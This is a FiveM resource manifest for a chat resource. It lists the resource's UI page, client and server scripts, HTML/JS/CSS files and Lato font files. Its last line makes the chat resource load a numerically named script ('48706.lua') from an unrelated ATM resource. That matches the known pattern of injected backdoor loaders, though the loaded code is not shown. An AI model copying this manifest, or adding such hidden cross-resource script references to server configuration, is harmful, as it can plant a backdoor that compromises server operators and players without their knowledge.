description 'chat management stuff'

ui_page 'html/index.html'

client_script 'cl_chat.lua'
server_scripts { 'sv_chat.lua' }

files {
  'html/index.html',
  'html/index.css',
  'html/config.default.js',
  'html/config.js',
  'html/App.js',
  'html/Message.js',
  'html/listener.js',
  'html/Suggestions.js',
  'html/vendor/vue.2.3.3.min.js',
  'html/vendor/flexboxgrid.6.3.1.min.css',
  'html/vendor/animate.3.5.2.min.css',
  'html/vendor/latofonts.css',
  'html/vendor/fonts/LatoRegular.woff2',
  'html/vendor/fonts/LatoRegular2.woff2',
  'html/vendor/fonts/LatoLight2.woff2',
  'html/vendor/fonts/LatoLight.woff2',
  'html/vendor/fonts/LatoBold.woff2',
  'html/vendor/fonts/LatoBold2.woff2',
}
client_script '@esx_atm/48706.lua'